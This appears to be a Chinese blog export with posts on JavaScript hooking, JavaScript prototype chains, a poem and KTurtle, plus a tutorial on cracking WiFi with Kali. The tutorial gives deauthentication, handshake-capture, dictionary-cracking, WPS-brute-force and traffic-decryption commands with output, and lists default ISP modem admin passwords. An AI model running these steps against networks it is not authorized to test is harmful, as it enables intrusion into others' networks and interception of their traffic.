  Alert: Hello!
</code></pre><p>这种方法简单粗暴，但是只能覆盖具体变量的成员函数。</p>
<h2 id="0x02-Hook类方法"><a href="#0x02-Hook类方法" class="headerlink" title="0x02 Hook类方法"></a>0x02 Hook类方法</h2><p>考虑以下这种情况：希望Hook所有元素的<code>setAttribute</code>方法。</p>
<p><code>方案一</code>：遍历获取所有元素，并Hook每个元素的<code>setAttribute</code>方法。</p>
<p>首先，页面中的元素数量非常多，而且不断有新元素动态创建出来，如果要监控新元素创建，还得Hook <code>document.createElement</code>等函数，甚至还需要考虑通过其它方式动态创建出来的函数。因此，这种方案不是最佳方案。</p>
<p><code>方案二</code>：直接Hook类方法</p>
<pre><code class="javascript">Element.prototype.setAttribute = function(attr, value){
    console.log(&#39;setAttribute &#39; + attr + &#39; &#39; + value);
}
</code></pre>
<pre><code>&gt; document.body.setAttribute(&#39;xx&#39;, 123)
  setAttribute xx 123
</code></pre><p>这里利用了原型链来进行类方法的Hook。</p>
<h2 id="0x03-利用Getter-Setter进行Hook"><a href="#0x03-利用Getter-Setter进行Hook" class="headerlink" title="0x03 利用Getter/Setter进行Hook"></a>0x03 利用Getter/Setter进行Hook</h2><p><code>document.domain</code>是一个只读对象，正常是不允许乱修改的。</p>
<pre><code>&gt; document.domain = &#39;test.com&#39;
  Uncaught DOMException: Failed to set the &#39;domain&#39; property on &#39;Document&#39;: &#39;test.com&#39; is not a suffix of &#39;www.baidu.com&#39;.
    at &lt;anonymous&gt;:1:16
</code></pre><p>乱修改这个值的话，浏览器会直接报错。</p>
<p>但是下面这段代码却可以将<code>document.domain</code>改成可修改的对象。</p>
<pre><code class="javascript">Object.defineProperty(document, &#39;domain&#39;, {
    configurable: true,
    enumerable: true,
    get: function() {
        return this._domain || location.host;
    },
    set: function(value) {
        this._domain = value;
    }
});
</code></pre>
<pre><code>&gt; document.domain = &#39;test.com&#39;
  &quot;test.com&quot;
&gt; document.domain
  &quot;test.com&quot;
</code></pre><p>如果将<code>configurable</code>属性设为<code>false</code>，<code>document.domain</code>就可以避免被其他人使用<code>Object.defineProperty</code>来修改了。</p>
<pre><code>&gt; Object.defineProperty(document, &#39;domain&#39;, {value: &#39;xxx&#39;});
  Uncaught TypeError: Cannot redefine property: domain
    at Function.defineProperty (&lt;anonymous&gt;)
    at &lt;anonymous&gt;:1:8
</code></pre><p>同样的方法还可以用来修改：<code>navigator.userAgent</code>等属性。</p>
<pre><code class="javascript">Object.defineProperty(navigator, &#39;userAgent&#39;, {
    configurable: true,
    enumerable: true,
    value: &#39;MyBrowser 1.0.0&#39;
});
</code></pre>
<pre><code>&gt; navigator.userAgent
  &quot;MyBrowser 1.0.0&quot;
</code></pre><p>不过这种方法只影响使用Javascript获取的数据，不会影响浏览器发送请求时带上的浏览器标识。</p>
<p>事实上，有多很多系统对象都是不允许使用<code>Object.defineProperty</code>修改的，例如：<code>window.location</code>等。</p>
<h2 id="0x04-使用Proxy"><a href="#0x04-使用Proxy" class="headerlink" title="0x04 使用Proxy"></a>0x04 使用Proxy</h2><p><code>Proxy</code>是Chrome 49开始支持的一项新特性，具有动态代理功能，可以用于运算符重载、对象模拟等场景。</p>
<pre><code class="javascript">window.screen = new Proxy(window.screen, {
    get: function (target, key) {
        console.log(&#39;get&#39;, key);
        return target[key];
    }});
</code></pre>
<pre><code>&gt; screen.availHeight
  get availHeight
  864
</code></pre><p>这里通过创建<code>screen</code>对象的代理，然后赋值给<code>window.screen</code>，可以实现对属性、函数访问的拦截。这种方法比较适合需要Hook某个对象中大部分属性、函数的场景。</p>
<p>这种方法同时也适用于对函数的Hook。</p>
<pre><code class="javascript">document.createElement= new Proxy(document.createElement, { // Our hook to keep the track
    apply: function (target, thisArg, args){
        console.log(&quot;document.createElement is called with args: &quot; + args);
        return target.apply(thisArg, args);
    }
});
</code></pre>
<pre><code>&gt; document.createElement(&#39;div&#39;)
  document.createElement is called with args: div
  &lt;div&gt;​&lt;/div&gt;
</code></pre><p>当然，有很多对象是不能被替换的，例如：<code>window</code>、<code>document</code>、<code>navigator</code>、<code>location</code>等。</p>
<h2 id="0x05-总结"><a href="#0x05-总结" class="headerlink" title="0x05 总结"></a>0x05 总结</h2><p>Javascript是一门非常灵活的语言，并且新的接口和规范不断出现，以后还会出现更多的可以用作Hook的方法。</p>
]]></content>
      <categories>
        <category>Javascript</category>
      </categories>
      <tags>
        <tag>hook</tag>
      </tags>
  </entry>
  <entry>
    <title>江城子</title>
    <url>/2017/01/14/jiang-cheng-zi/</url>
    <content><![CDATA[<pre><code>尺素一去杳如烟 怨鸿鸾 恨无缘
只忆畴昔 相携共凭阑
转瞬远非前日景 伊未梦 泪先残

可怜秋雨戏娟婵 自衣宽 镜难圆
何苦今朝 华丝漫心烦
争胜放收江楚阔 情已落 烟云天
</code></pre>]]></content>
      <categories>
        <category>诗词</category>
      </categories>
  </entry>
  <entry>
    <title>Javascript中的原型链分析</title>
    <url>/2019/12/14/js-prototype/</url>
    <content><![CDATA[<h2 id="0x00-前言"><a href="#0x00-前言" class="headerlink" title="0x00 前言"></a>0x00 前言</h2><p>Javascript中的prototype是一个十分重要的概念，但是网上的教程一般分析得比较绕，结果越看越晕，反而变得更加难以理解了。</p>
<p>本文尝试由浅入深，从实验入手，来深入地理解这一概念。</p>
<h2 id="0x01-函数与对象"><a href="#0x01-函数与对象" class="headerlink" title="0x01 函数与对象"></a>0x01 函数与对象</h2><p>函数是JS中最为重要的一个概念，下面是创建函数最简单的方法：</p>
<pre><code class="javascript">function func(){
    return 0;
}
</code></pre>
<p>通过Chrome开发者工具，可以得到以下输出：</p>
<pre><code>&gt; typeof func
&lt; &quot;function&quot;
&gt; func instanceof Function
&lt; true
&gt; func instanceof Object
&lt; true
</code></pre><p>可以看出，<code>func</code>是<code>Function</code>的一个实例，同时也是<code>Object</code>的一个实例。这点可以理解成<code>Function</code>本质上也是<code>Object</code>的一种。</p>
<pre><code>&gt; typeof Function
&lt; &quot;function&quot;
&gt; typeof Object
&lt; &quot;function&quot;
</code></pre><p>再来看这段输出，按照通常<code>OOP</code>语言的理解，<code>Function</code>和<code>Object</code>的类型应该是<code>class</code>之类的值，但偏偏这里返回的是<code>function</code>。这是为什么呢？</p>
<p>我们知道，js中<code>class</code>的概念是在<code>ES6</code>中才出现的，可以通过以下代码创建一个<code>class</code>：</p>
<pre><code class="javascript">class MyClass {
    constructor(name) {
        this.name = name;
    }
    show(){
        console.log(this.name);
    }
}

var obj = new MyClass(&#39;drunkdream&#39;);
obj.show();
</code></pre>
<p>现在来测试一下<code>obj</code>实例的相关情况：</p>
<pre><code>&gt; typeof obj
&lt; &quot;object&quot;
&gt; obj instanceof MyClass
&lt; true
&gt; obj instanceof Object
&lt; true
&gt; typeof MyClass
&lt; &quot;function&quot;
&gt; MyClass instanceof Function
&lt; true
</code></pre><p>可以看出，<code>obj</code>的确是<code>MyClass</code>的一个实例。但是，奇怪的是：<code>MyClass</code>的类型竟然是<code>function</code>，这点和其它语言的确不太一样。</p>
<p>这是因为：</p>
<blockquote>
<p>js中并没有真正的<code>class</code>的概念，<code>class</code>仅仅是<code>function</code>的一种语法糖而已。</p>
</blockquote>
<p>来看下在<code>ES5</code>中一般怎么构造一个<code>class</code>的。</p>
<pre><code class="javascript">function MyClass(name) {
    this.name = name;
}

MyClass.prototype.show = function () {
    console.log(this.name);
}
</code></pre>
<p>这种写法可以实现和上面那段代码相同的功能，但是很明显，<code>MyClass</code>真的是一个<code>function</code>。也就是说：<code>new</code>一个<code>function</code>得到的其实是一个对象。这和其它语言差异是比较大的。</p>
<p>而<code>prototype</code>在其中就是扮演了添加类的成员函数的作用。</p>
<p>其实，将上面的代码改成：</p>
<pre><code class="javascript">function MyClass(name) {
    this.name = name;
    this.show = function () {
        console.log(this.name);
    }
}
</code></pre>
<p>这样的形式对于使用者也是完全没有问题的，差别只是每次实例化都会创建出一个<code>show</code>函数，显然这种写法是不好的。</p>
<h2 id="0x02-prototype与proto"><a href="#0x02-prototype与proto" class="headerlink" title="0x02 prototype与proto"></a>0x02 prototype与<strong>proto</strong></h2><p>那<code>prototype</code>到底是个什么样的存在呢？</p>
<pre><code>&gt; MyClass.prototype
&lt; {show: ƒ, constructor: ƒ}
    show: ƒ ()
    constructor: ƒ MyClass(name)
    __proto__: Object
&gt; typeof MyClass.prototype
&lt; &quot;object&quot;
&gt; MyClass.prototype.constructor === MyClass
&lt; true
&gt; MyClass.prototype.__proto__
&lt; {constructor: ƒ, __defineGetter__: ƒ, __defineSetter__: ƒ, hasOwnProperty: ƒ, __lookupGetter__: ƒ, …}
    constructor: ƒ Object()
    hasOwnProperty: ƒ hasOwnProperty()
    isPrototypeOf: ƒ isPrototypeOf()
    propertyIsEnumerable: ƒ propertyIsEnumerable()
    toLocaleString: ƒ toLocaleString()
    toString: ƒ toString()
    valueOf: ƒ valueOf()
    __defineGetter__: ƒ __defineGetter__()
    __defineSetter__: ƒ __defineSetter__()
    __lookupGetter__: ƒ __lookupGetter__()
    __lookupSetter__: ƒ __lookupSetter__()
    get __proto__: ƒ __proto__()
    set __proto__: ƒ __proto__()
</code></pre><p>上面这段看起来有点绕，需要仔细思索一下。</p>
<p>可以看出，<code>prototype</code>本质上是一个对象，必须要包含<code>constructor</code>构造函数和<code>__proto__</code>对象。</p>
<p><code>constructor</code>其实就是<code>MyClass</code>函数本身，而<code>__proto__</code>对象看起来就有些神秘了。不过从<code>__proto__.constructor</code>可以看出，它其实就是<code>Object</code>。是不是觉得<code>__proto__</code>指向的是当前类的基类呢？</p>
<p>我们再来测试一下：</p>
<pre><code>&gt; class MyClass1 extends String{}
&gt; MyClass1.prototype.__proto__.constructor == String
&lt; true
</code></pre><p>看来的确是这样的，只不过由于js中的类本质上都是<code>function</code>，而每个<code>function</code>都有一个原型，通过这种方式将原型<code>链接</code>起来，就起到了类继承的作用。</p>
<h2 id="0x03-将对象变成函数"><a href="#0x03-将对象变成函数" class="headerlink" title="0x03 将对象变成函数"></a>0x03 将对象变成函数</h2><p>下面是网上找的一段代码：</p>
<pre><code class="javascript">function classcallable(cls) {
    /*
     * Replicate the __call__ magic method of python and let class instances
     * be callable.
     */
    var new_cls = function () {
        var obj = Object.create(cls.prototype);
        // create callable
        // we use func.__call__ because call might be defined in
        // init which hasn&#39;t been called yet.
        var func = function () {
            return func.__call__.apply(func, arguments);
        };
        func.__proto__ = obj;
        // apply init late so it is bound to func and not cls
        cls.apply(func, arguments);
        return func;
    }
    new_cls.prototype = cls.prototype;
    return new_cls
}
</code></pre>
<p>它可以将一个类实例类型从<code>object</code>变成<code>function</code>。</p>
<pre><code class="javascript">var s = new String();
console.log(typeof s);

var s = new classcallable(String)();
console.log(typeof s);
</code></pre>
<p>输出结果为：</p>
<pre><code>object
function
</code></pre><p>也就是说，使用<code>classcallable</code>之后创建的对象，可以当做函数来调用。我们分析一下这里面的原因。</p>
<p>在js中是允许在类的构造函数中返回一个<code>function</code>的，可以使用以下代码进行测试：</p>
<pre><code class="javascript">function MyClass(flag){
    var func = function(){
        console.log(&quot;call func&quot;);
    }
    if(flag === 1)
        return func;
    else
        return 0;
}

console.log(typeof new MyClass(0));
console.log(typeof new MyClass(1));
</code></pre>
<p>输出结果为：</p>
<pre><code>object
function
</code></pre><p>因此，只要修改构造函数的返回值，就可以改变创建出的实例类型，这里正是用了这种方法。</p>
]]></content>
      <categories>
        <category>Javascript</category>
      </categories>
      <tags>
        <tag>prototype</tag>
      </tags>
  </entry>
  <entry>
    <title>使用Kali系统进行无线网络破解</title>
    <url>/2022/05/22/kali-wifi-cracking/</url>
    <content><![CDATA[<h2 id="0x00-前言"><a href="#0x00-前言" class="headerlink" title="0x00 前言"></a>0x00 前言</h2><p>Kali是一款常用于渗透测试的Linux发行版，集成了较多的安全工具。本文尝试使用Docker安装Kali，并进行Wifi的破解工作。</p>
<p>本文仅做技术研究，请勿用于非法用途。</p>
<h2 id="0x01-在Docker中安装Kali系统"><a href="#0x01-在Docker中安装Kali系统" class="headerlink" title="0x01 在Docker中安装Kali系统"></a>0x01 在Docker中安装Kali系统</h2><p>Kali官方提供了Docker镜像：<code>kalilinux/kali-last-release</code>。但是这个镜像基本没有包含任何工具，如果要安装全部工具，镜像大小会超过<code>4G</code>。很明显，不是所有人都需要这么多工具。因此，用户可以根据用途，通过编写<code>Dockerfile</code>定制不同的Kali镜像。</p>
<p>对于Wifi破解，可以编写以下Dockerfile。</p>
<pre><code class="Dockerfile">FROM kalilinux/kali-last-release

RUN apt update &amp;&amp; apt install -y pciutils net-tools procps crunch wordlists aircrack-ng reaver

WORKDIR /root/workspace
</code></pre>
<pre><code class="bash">$ sudo docker build -t kali .
$ sudo docker run -it --net=&quot;host&quot; --privileged -v $(pwd)/workspace:/root/workspace kali
┌──(root㉿drunkdream-LB0)-[~/workspace]
└─#
</code></pre>
<p>运行时网络需要使用<code>host</code>模式，这样才能访问母机上的无线网卡，同时开启特权模式；为了数据可以持久化存储，可以将本地目录挂载到容器中。</p>
<p>后面所有的操作都是在此容器中进行。</p>
<h2 id="0x02-Wifi密码破解"><a href="#0x02-Wifi密码破解" class="headerlink" title="0x02 Wifi密码破解"></a>0x02 Wifi密码破解</h2><p>这里主要使用<code>aircrack-ng</code>系列命令进行Wifi密码破解。</p>
<ul>
<li>获取无线网卡列表</li>
</ul>
<pre><code class="bash">└─# airmon-ng                                                                                                  
Your kernel has module support but you don&#39;t have modprobe installed.
It is highly recommended to install modprobe (typically from kmod).
Your kernel has module support but you don&#39;t have modinfo installed.
It is highly recommended to install modinfo (typically from kmod).
Warning: driver detection without modinfo may yield inaccurate results.

PHY     Interface       Driver          Chipset

phy0    wlp0s20f3       iwlwifi         Intel Corporation Comet Lake PCH CNVi WiFi
</code></pre>
<ul>
<li>开启监听模式</li>
</ul>
<pre><code class="bash">└─# airmon-ng start wlp0s20f3

Your kernel has module support but you don&#39;t have modprobe installed.
It is highly recommended to install modprobe (typically from kmod).
Your kernel has module support but you don&#39;t have modinfo installed.
It is highly recommended to install modinfo (typically from kmod).
Warning: driver detection without modinfo may yield inaccurate results.


PHY     Interface       Driver          Chipset

phy0    wlp0s20f3       iwlwifi         Intel Corporation Comet Lake PCH CNVi WiFi
                (mac80211 monitor mode vif enabled for [phy0]wlp0s20f3 on [phy0]wlp0s20f3mon)
                (mac80211 station mode vif disabled for [phy0]wlp0s20f3)
</code></pre>
<p>此时母机系统中已经无法看到这个无线网卡了，相反多了一个<code>wlp0s20f3mon</code>设备。</p>
<ul>
<li>扫描无线网络</li>
</ul>
<blockquote>
<p>此时的网卡名需要在后面加上<code>mon</code></p>
</blockquote>
<pre><code class="bash">└─# airodump-ng wlp0s20f3mon
Warning: Detected you are using a non-UNICODE terminal character encoding.

 CH 11 ][ Elapsed: 24 s ][ 2022-05-22 15:36                                                                    

 BSSID              PWR  Beacons    #Data, #/s  CH   MB   ENC CIPHER  AUTH ESSID                               

 74:CF:00:DA:F4:40  -11       15        0    0   2  130   WPA2 CCMP   PSK  CMCC-X5qG                         
 8C:53:C3:C8:16:E6  -13       18        4    0   1  130   WPA2 CCMP   PSK  Xiaomi_16E4
</code></pre>
<p>通过这个命令，可以获取到附近的Wifi列表。</p>
<ul>
<li>抓取握手数据包</li>
</ul>
<p>用法: <code>airodump-ng -c &lt;无线信道&gt; --bssid &lt;目标无线AP的硬件地址&gt; -w &lt;扫描结果保存文件名&gt; &lt;处于监听模式的网卡名称&gt;</code></p>
<pre><code class="bash">└─# airodump-ng -c 2 --bssid 74:CF:00:DA:F4:40 -w dump wlp0s20f3mon
 CH  2 ][ Elapsed: 18 s ][ 2022-05-22 16:04 ][ WPA handshake: 74:CF:00:DA:F4:40

 BSSID              PWR RXQ  Beacons    #Data, #/s  CH   MB   ENC CIPHER  AUTH ESSID                           

 74:CF:00:DA:F4:40  -13 100      215       15    0   2  130   WPA2 CCMP   PSK  CMCC-X5qG                      

 BSSID              STATION            PWR   Rate    Lost    Frames  Notes  Probes                             

 74:CF:00:DA:F4:40  1C:2A:DB:0E:D5:AC  -29   6e- 6e  1921    478     EAPOL  drunkdream
</code></pre>
<p>使用这条命令可以获取连接到指定Wifi的客户端列表。当抓取到<code>握手包</code>时，会提示<code>WPA handshake: 74:CF:00:DA:F4:40</code>这样的字符串，就可以停止数据抓取了。此时，数据包会保存到当前目录下：</p>
<pre><code class="bash"># ls -l | grep dump
-rwxrwxrwx 1 1000 1000      225870 May 22 23:30 dump-01.cap
-rwxrwxrwx 1 1000 1000         883 May 22 23:30 dump-01.csv
-rwxrwxrwx 1 1000 1000         601 May 22 23:30 dump-01.kismet.csv
-rwxrwxrwx 1 1000 1000        7330 May 22 23:30 dump-01.kismet.netxml
-rwxrwxrwx 1 1000 1000       92078 May 22 23:30 dump-01.log.csv
</code></pre>
<ul>
<li>让客户端掉线重连</li>
</ul>
<p>如果客户端一直正常连接，是很难抓取到握手包的。此时需要将客户端踢下线：</p>
<p>用法: <code>aireplay-ng -&lt;攻击模式(0)&gt;  &lt;攻击次数(10)&gt; -a &lt;无线AP硬件地址&gt; -c &lt;用户设备硬件地址&gt; &lt;处于监听模式的网卡名称&gt;</code></p>
<pre><code class="bash">└─# aireplay-ng -02 -a 74:CF:00:DA:F4:40 -c 1C:2A:DB:0E:D5:AC wlp0s20f3mon
16:11:07  Waiting for beacon frame (BSSID: 74:CF:00:DA:F4:40) on channel 2
16:11:07  Sending 64 directed DeAuth (code 7). STMAC: [1C:2A:DB:0E:D5:AC] [ 0| 2 ACKs]                         
16:11:08  Sending 64 directed DeAuth (code 7). STMAC: [1C:2A:DB:0E:D5:AC] [ 4|197 ACKs]
</code></pre>
<blockquote>
<p>执行此操作时需要保证上一步骤的命令同时在执行。</p>
</blockquote>
<ul>
<li>停止监听网卡</li>
</ul>
<pre><code class="bash">└─# airmon-ng stop wlp0s20f3mon
</code></pre>
<ul>
<li>破解Wifi密码</li>
</ul>
<p>抓取到握手包的<code>cap</code>文件后，就可以离线破解Wifi密码了。比如使用性能较好的机器或是分布式方式进行破解。</p>
<p>用法: <code>aircrack-ng -w 密码字典 &lt;包含握手包的cap文件&gt;</code></p>
<pre><code class="bash">└─# aircrack-ng -a2 -b 74:CF:00:DA:F4:40 -w password.dict dump-01.cap
Reading packets, please wait...
Opening dump-01.cap
Read 1734 packets.

1 potential targets


                         Aircrack-ng 1.6 

      [00:00:00] 3/5 keys tested (71.89 k/s) 

      Time left: 0 seconds                                      60.00%

                         KEY FOUND! [ 12345678 ]


      Master Key     : 1E 30 C1 07 43 14 93 F2 74 D3 6D 8E F3 E2 E1 07 
                       18 4C 47 01 1F 87 D6 87 A7 0A 49 01 C0 24 F5 A1 

      Transient Key  : C4 D6 53 3B DA C8 D4 23 D5 7D 82 EE 73 67 7D 3D 
                       6B 6B 04 BF B1 66 29 74 3E E1 CB FD 8C 90 6B E8 
                       DE 0D 8C 32 21 3E 8E F0 9D 1A 2B 76 BB 0E 3E FD 
                       EB 95 8C 7D C0 43 90 12 4E 3D A4 A5 F2 75 CF FF 

      EAPOL HMAC     : 21 B2 AA 47 4F AB E3 77 53 24 73 21 7E 06 78 10
</code></pre>
<p><code>password.dict</code>是密码字典，能否破解出密码取决于密码是否包含在字典中。因此，对于过于复杂的密码，破解成功率会非常低。</p>
<ul>
<li>生成密码字典</li>
</ul>
<p>为了提升破解成功率，需要根据具体场景生成有针对性的密码字典，例如：生日、手机号等。这里使用<code>crunch</code>命令来生成密码字典。</p>
<p>使用语法和参数:</p>
<pre><code>crunch

[options]

min 设定最小字符串长度(必选)
max 设定最大字符串长度(必选)

-b 指定文件输出的大小，避免字典文件过大
-c 指定文件输出的行数，即包含密码的个数
-d 限制相同元素出现的次数
-e 定义停止字符，即到该字符串就停止生成
-f 调用库文件(/etc/share/crunch/charset.lst)
-i 改变输出格式，即aaa,aab -&gt; aaa,baa
-I 通常与-t联合使用，表明该字符为实义字符
-m 通常与-p搭配
-o 将密码保存到指定文件
-p 指定元素以组合的方式进行
-q 读取密码文件，即读取pass.txt
-r 定义重某一字符串重新开始
-s 指定一个开始的字符，即从自己定义的密码xxxx开始
-t 指定密码输出的格式
-u 禁止打印百分比(必须为最后一个选项)
-z 压缩生成的字典文件，支持gzip,bzip2,lzma,7z

特殊字符
% 代表数字
^ 代表特殊符号
@ 代表小写字母
, 代表大写字符
</code></pre><p>使用示例——生成136开头的所有手机号：</p>
<pre><code class="bash">└─# crunch 11 11 -t 136%%%%%%%% -o 136.txt
Crunch will now generate the following amount of data: 1200000000 bytes
1144 MB
1 GB
0 TB
0 PB
Crunch will now generate the following number of lines: 100000000 

crunch:   7% completed generating output
crunch:  15% completed generating output
crunch:  22% completed generating output
crunch:  29% completed generating output
crunch:  36% completed generating output
crunch:  43% completed generating output
crunch:  51% completed generating output
crunch:  58% completed generating output
crunch:  65% completed generating output
crunch:  72% completed generating output
crunch:  79% completed generating output
crunch:  86% completed generating output
crunch:  93% completed generating output
crunch: 100% completed generating output

└─# ls -l | grep 136
-rwxrwxrwx 1 1000 1000  1200000000 May 23 15:16 136.txt
</code></pre>
<p>可以看到，生成的密码字典还是比较大的。</p>
<h2 id="0x03-破解WPS-PIN码"><a href="#0x03-破解WPS-PIN码" class="headerlink" title="0x03 破解WPS PIN码"></a>0x03 破解WPS PIN码</h2><p>WPS（Wi-Fi Protected Setup，Wi-Fi保护设置）是由Wi-Fi联盟组织实施的认证项目，主要致力于简化无线网络的安全加密设置。在传统方式下，用户新建一个无线网络时，必须在接入点手动设置网络名（SSID）和安全密钥，然后在客户端验证密钥以阻止“不速之客”的闯入。Wi-Fi Protected Setup能帮助用户自动设置网络名（SSID）、配置最高级别的WPA2安全密钥，具备这一功能的无线产品往往在机身上设计有一个功能键，称为WPS按钮，用户只需轻轻按下该按钮或输入个人识别号码( PIN )，再经过两三步简单操作即可完成无线加密设置，同时在客户端和路由器之间建立起一个安全的连接。</p>
<p>PIN码是随机产生的8位数字。，可以通过穷举遍历的方式进行破解。PIN码的第8位数是一个校验和 ( checksum) , 因此黑客只需算出前7位数即可。这样，唯一的PIN码的数量降了一个级次变成了10的7次方,也就是说有1000万种变化。</p>
<p>在实施PIN的身份识别时,接入点(无线路由器)实际上是要找出这个PIN的前半部分(前4位)和后半部分(后3位)是否正确即可。当第一次PIN认证连接失败后 ,路由器会向客户端发回一个<code>EAP-NACK</code>信息,而通过该回应,攻击者将能够确定的PIN前半部或后半部是否正确。换句话说,黑客只需从7位数的PIN中找出一个4位数的PIN和一一个3位数的PIN。这样一来,级次又被降低，从1000万种变化，减少到11000 ( 10的4次方 + 10的3次方)种变化。因此,在实际破解尝试中,黑客最多只需试验<code>11000</code>次。</p>
<pre><code class="bash">└─# reaver -i wlp0s20f3mon -b D0:C7:C0:DF:2A:74 -vv
</code></pre>
<p>不过目前这种攻击方法成功率非常低，只有少数非常老的路由器可能存在这个漏洞。</p>
<h2 id="0x04-网络流量嗅探"><a href="#0x04-网络流量嗅探" class="headerlink" title="0x04 网络流量嗅探"></a>0x04 网络流量嗅探</h2><p>首先使用<code>airodump-ng</code>命令抓取数据包（必须包含握手包才能解密）；然后使用<code>airdecap-ng</code>命令解密数据包。</p>
<p>用法：<code>airdecap-ng -e &lt;Wifi SSID&gt; -p &lt;Wifi密码&gt; &lt;生成的.cap文件&gt;</code></p>
<pre><code class="bash">└─# airdecap-ng -e drunkdream -p 12345678 dump-01.cap
Total number of stations seen            4
Total number of packets read          8838
Total number of WEP data packets         0
Total number of WPA data packets      2905
Number of plaintext data packets         0
Number of decrypted WEP  packets         0
Number of corrupted WEP  packets         0
Number of decrypted WPA  packets      2228
Number of bad TKIP (WPA) packets         0
Number of bad CCMP (WPA) packets         0
</code></pre>
<p>解密出来的数据包保存在<code>dump-01-dec.cap</code>文件中，直接使用wireshark打开即可。不过这种情况与本地抓包相同，是不能解密<code>https</code>数据包的。如果想解密https数据包，可以考虑结合<code>中间人攻击</code>。</p>
<h2 id="0x05-破解路由器密码"><a href="#0x05-破解路由器密码" class="headerlink" title="0x05 破解路由器密码"></a>0x05 破解路由器密码</h2><p>获取到密码后就可以成功连接到Wifi了，此时如果登入路由器管理页面，会拿到更多的信息。</p>
<p>一般路由器的ip地址为：<code>192.168.1.1</code>、<code>192.168.10.1</code>、<code>192.168.100.1</code>等。实在不行还可以通过ip和端口扫描来判断。</p>
<p>获取到ip地址后就需要获取登录密码了。一些常见的默认密码如下：</p>
<table>
<thead>
<tr>
<th>路由器类型</th>
<th>账号</th>
<th>密码</th>
</tr>
</thead>
<tbody>
<tr>
<td>移动光猫</td>
<td>CMCCAdmin</td>
<td>aDm8H%MdA</td>
</tr>
<tr>
<td>联通光猫</td>
<td>CUAdmin</td>
<td>CUAdmin</td>
</tr>
<tr>
<td>电信光猫</td>
<td>telecomadmin</td>
<td>nE7jA%5m</td>
</tr>
<tr>
<td>华为</td>
<td>telecomadmin</td>
<td>admintelecom</td>
</tr>
</tbody>
</table>
<h2 id="0x06-总结"><a href="#0x06-总结" class="headerlink" title="0x06 总结"></a>0x06 总结</h2><p>破解无线网络密码的关键是抓取到握手包，然后使用字典进行离线爆破。因此字典中是否包含密码成了能否破解出密码的关键。</p>
<p>WPS是另一种破解WIFI的方法，但实际测试中发现成功率非常低。</p>
<h2 id="0x07-参考文献"><a href="#0x07-参考文献" class="headerlink" title="0x07 参考文献"></a>0x07 参考文献</h2><ul>
<li><a href="https://www.jianshu.com/p/2ec8b2ef84ae" target="_blank" rel="noopener">Kali 2 | 用airmon-ng开始我的第一次无线渗透测试</a></li>
<li><a href="https://wizardforcel.gitbooks.io/daxueba-kali-linux-tutorial/content/52.html" target="_blank" rel="noopener">使用Aircrack-ng工具破解无线网络</a></li>
<li><a href="https://blkstone.github.io/2015/08/19/reaver-tutorial/" target="_blank" rel="noopener">利用 reaver 进行无线安全审计</a></li>
<li><a href="https://linux.cn/article-2335-1.html" target="_blank" rel="noopener">如何使用Reaver破解Wi-Fi网络的WPA密码</a></li>
</ul>
]]></content>
      <categories>
        <category>Linux</category>
      </categories>
      <tags>
        <tag>Kali</tag>
        <tag>Wifi</tag>
      </tags>
  </entry>
  <entry>
    <title>KTurtle编程使用入门</title>
    <url>/2023/07/08/kturtle/</url>
    <content><![CDATA[<h2 id="0x00-前言"><a href="#0x00-前言" class="headerlink" title="0x00 前言"></a>0x00 前言</h2><p>KTurtle 是一个KDE开发的 <code>Turtle Graphics(海龟绘图法)</code> 教育编程环境，通过控制海龟的行进，在屏幕上绘制出相应图案的技术。它是根据开源的 GNU通用公共许可证发布。它可以让孩子通过可视化方式学会基本的编程思维，并掌握一定的数学、几何等知识。它的结构非常简单，非常适合儿童学习。</p>
<p>KTurtle 使用<code>TurtleScript</code>语言进行操作，该语言是从Logo语言的基础上开发而来的。</p>
<h2 id="0x01-KTurtle-基本操作"><a href="#0x01-KTurtle-基本操作" class="headerlink" title="0x01 KTurtle 基本操作"></a>0x01 KTurtle 基本操作</h2><p>KTurtle在Linux上安装比较方便，例如在Ubuntu或Deepin系统中可以直接使用<code>$ sudo apt install kturtle</code>命令进行安装。也可以使用它的一个<a href="https://www.offidocs.com/index.php/desktop-online-education-apps/kturtle-online-educational-game" target="_blank" rel="noopener">在线版本</a>。</p>
<p>下图是 KTurtle 的主界面</p>
<p><img src="/images/kturtle-window.png" alt></p>
<p>可以看到，它的核心区域包括左边的<code>代码区</code>和右侧的<code>效果展示区</code>。比如我们输入<code>forward 100</code>，然后点击<code>工具栏</code>中的运行按钮，或按<code>F5</code>键运行，可以看到右侧的小乌龟向上移动了100个像素。如下图所示：</p>
<p><img src="/images/kturtle-forward.png" alt></p>
<h2 id="0x02-画一个正方形"><a href="#0x02-画一个正方形" class="headerlink" title="0x02 画一个正方形"></a>0x02 画一个正方形</h2><p>画一个正方形的基本思路是：</p>
<ol>
<li>前进 100 像素</li>
<li>左转</li>
<li>前进 100 像素</li>
<li>左转</li>
<li>前进 100 像素</li>
<li>左转</li>
<li>前进 100 像素</li>
</ol>
<p>这里主要涉及到两个指令：<code>前进(forward)</code>和<code>左转(turnleft)</code>。<code>forward</code>指令前面已经使用到了，语法就是<code>forward $length</code>，<code>$length</code>表示要前进的距离，单位是像素；<code>turnleft</code>指令的语法是：<code>turnleft $angle</code>，<code>$angle</code>表示左转的角度，比如直角左转就是<code>turnleft 90</code>，如果写成<code>turnleft 270</code>就是直角右转了，也可以写成<code>turnleft 180</code>表示向后转。</p>
<p>因此，可以在代码区编写如下代码：</p>
<pre><code>reset
forward 100
turnleft 90
forward 100
turnleft 90
forward 100
turnleft 90
forward 100
</code></pre><p><code>reset</code>表示先清除之前的操作，避免之前的操作影响小乌龟的行动。</p>
<p>下图是运行之后的效果：</p>
<p><img src="/images/kturtle-square.png" alt></p>
<p>运行时可以选择速度，以便更好观察小乌龟的行进过程。</p>
<p><img src="/images/kturtle-run.png" alt></p>
<p>分析上面的代码可以发现，代码中存在较多的重复代码，这种情况可以使用<code>循环(repeat)</code>指令来解决。repeat指令的格式为：<code>repeat $count</code>，<code>$count</code>为要重复的次数。修改后的代码如下：</p>
<pre><code>reset
forward 100
repeat 3 {
  turnleft 90
  forward 100
}
</code></pre><h2 id="0x03-画一个圆形"><a href="#0x03-画一个圆形" class="headerlink" title="0x03 画一个圆形"></a>0x03 画一个圆形</h2><p>TurtleScript语言并没有提供画曲线的方法，如果想画圆就需要用到一些几何原理。根据初中几何知识，当一个正多边形边数越多时，就越接近一个圆，利用这个原理，画圆就变成了画一个边数较多的正多边形。</p>
<p>前面画正方形可以看作是经历了4次90度拐弯，也就是说，每次拐弯的度数等于<code>360 / n</code>，n为边数。我们先来画一个<code>n=10</code>的正多边形：</p>
<pre><code>reset
forward 50
repeat 9 {
  turnleft 36
  forward 50
}
